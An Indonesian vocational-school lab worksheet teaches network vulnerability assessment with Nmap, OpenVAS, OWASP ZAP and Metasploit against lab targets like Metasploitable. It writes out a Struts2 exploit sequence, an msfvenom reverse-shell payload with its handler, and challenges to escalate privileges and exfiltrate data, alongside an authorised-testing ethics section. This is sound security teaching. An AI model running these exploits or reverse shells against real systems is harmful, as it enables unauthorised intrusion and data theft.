# 🛠️ Praktikum: Analisis Kerentanan Jaringan

## 🎯 Tujuan Pembelajaran
Setelah menyelesaikan praktikum ini, peserta didik mampu:
1. Melakukan pemindaian kerentanan jaringan
2. Menganalisis hasil pemindaian keamanan
3. Mengidentifikasi kerentanan umum pada sistem
4. Melaporkan temuan kerentanan
5. Merekomendasikan tindakan perbaikan

## 📋 Persiapan

### 1. Peralatan yang Diperlukan
- Komputer dengan sistem operasi Linux (disarankan Kali Linux)
- Mesin virtual (VirtualBox/VMware)
- Target uji (Metasploitable, DVWA, atau sistem rentan lainnya)
- Koneksi jaringan yang stabil

### 2. Perangkat Lunak yang Diperlukan
- Nmap
- OpenVAS/GVM
- OWASP ZAP
- Wireshark
- Metasploit Framework
- Nikto

## 📝 Langkah Kerja

### 1. Pemindaian Jaringan dengan Nmap

#### 1.1 Pemindaian Port Dasar
```bash
# Pemindaian port TCP
sudo nmap -sS -T4 -A -v target_ip -oN nmap_scan.txt

# Pemindaian UDP (memerlukan hak akses root)
sudo nmap -sU -T4 target_ip -oN nmap_udp_scan.txt

# Deteksi sistem operasi dan versi layanan
sudo nmap -O -sV target_ip -oN nmap_os_scan.txt
```

#### 1.2 Pemindaian dengan NSE Script
```bash
# Cari kerentanan umum
sudo nmap --script vuln target_ip -oN nmap_vuln_scan.txt

# Periksa kerentanan SMB
sudo nmap --script smb-vuln-* --script-args=unsafe=1 -p 445 target_ip

# Periksa kerentanan HTTP
sudo nmap --script http-vuln-* -p 80,443 target_ip
```

### 2. Analisis Kerentanan dengan OpenVAS/GVM

#### 2.1 Persiapan OpenVAS
```bash
# Mulai layanan GVM
sudo gvm-start

# Buka browser dan akses:
# https://127.0.0.1:9392
# Login dengan kredensial default (admin/admin)
```

#### 2.2 Membuat Target dan Task
1. Buka tab "Configuration" > "Targets"
2. Klik ikon bintang untuk membuat target baru
3. Isi detail target (nama, host, port)
4. Simpan target
5. Buat task baru di tab "Scans" > "Tasks"
6. Pilih target yang telah dibuat
7. Mulai pemindaian

#### 2.3 Menganalisis Hasil
1. Setelah pemindaian selesai, buka laporan
2. Identifikasi kerentanan berdasarkan tingkat keparahan
3. Catat detail kerentanan (deskripsi, dampak, solusi)
4. Ekspor laporan dalam format PDF/HTML

### 3. Pengujian Keamanan Aplikasi Web dengan OWASP ZAP

#### 3.1 Konfigurasi Dasar
1. Buka OWASP ZAP
2. Konfigurasi browser untuk menggunakan ZAP sebagai proxy (localhost:8080)
3. Aktifkan mode pengguna aktif (HUD)

#### 3.2 Pemindaian Otomatis
```
1. Masukkan URL target di ZAP
2. Klik kanan pada situs target
3. Pilih "Attack" > "Active Scan"
4. Tinjau hasil pemindaian di tab "Alerts"
```

#### 3.3 Analisis Manual
1. Identifikasi parameter URL yang rentan
2. Uji input dengan payload XSS dan SQLi
3. Periksa header keamanan (CSP, HSTS, dll.)
4. Uji manajemen sesi dan autentikasi

### 4. Eksploitasi dengan Metasploit Framework

#### 4.1 Mencari Eksploit yang Tersedia
```bash
msfconsole
msf6 > search type:exploit platform:linux
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 (exploit) > show options
msf6 (exploit) > set RHOSTS target_ip
msf6 (exploit) > set TARGETURI /struts2-showcase/
msf6 (exploit) > exploit
```

#### 4.2 Membuat Payload dengan msfvenom
```bash
# Buat payload reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf

# Setelah file diunggah ke target
chmod +x shell.elf
./shell.elf

# Di mesin penyerang
msf6 > use exploit/multi/handler
msf6 (exploit) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 (exploit) > set LHOST your_ip
msf6 (exploit) > exploit
```

## 📋 Laporan Praktikum

### 1. Pendahuluan
Jelaskan tujuan dan latar belakang praktikum analisis kerentanan jaringan.

### 2. Alat dan Bahan
Daftar semua peralatan dan perangkat lunak yang digunakan.

### 3. Langkah Kerja
Jelaskan langkah-langkah yang telah dilakukan selama praktikum.

### 4. Hasil Pengamatan
#### 4.1 Hasil Pemindaian Nmap
```
# Tempelkan hasil perintah nmap yang relevan
```

#### 4.2 Temuan OpenVAS/GVM
- Daftar 5 kerentanan kritis/high yang ditemukan
- Dampak potensial dari setiap kerentanan

#### 4.3 Hasil OWASP ZAP
- Daftar kerentanan yang ditemukan
- Contoh payload yang berhasil mengeksploitasi kerentanan

### 5. Analisis
1. Kerentanan apa yang paling berbahaya? Mengapa?
2. Bagaimana cara mengamankan sistem dari kerentanan yang ditemukan?
3. Langkah-langkah apa yang harus diambil untuk mencegah serangan serupa di masa depan?

### 6. Kesimpulan dan Rekomendasi
Berikan kesimpulan dari praktikum dan rekomendasi perbaikan.

## 📌 Tantangan Lanjutan
1. Coba lakukan privilege escalation pada sistem target
2. Eksplorasi teknik bypass autentikasi
3. Coba eksfiltrasi data dari sistem target

## ⚠️ Etika dan Keamanan
1. HANYA lakukan pengujian pada sistem yang Anda miliki atau memiliki izin tertulis
2. Dokumentasikan SEMUA aktivitas pengujian
3. Laporkan kerentanan yang ditemukan kepada pemilik sistem
4. Patuhi hukum dan peraturan yang berlaku

## 📚 Referensi
1. NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment
2. OWASP Testing Guide v4.2
3. Metasploit: The Penetration Tester's Guide
4. Nmap Network Scanning (2023) - Gordon Lyon

---
<div align="center">
  <p>Lembar Kerja Praktikum - Analisis Kerentanan Jaringan</p>
  <p>© 2025 SMKN 1 Punggelan - Program Keahlian Teknik Komputer dan Jaringan</p>
</div>
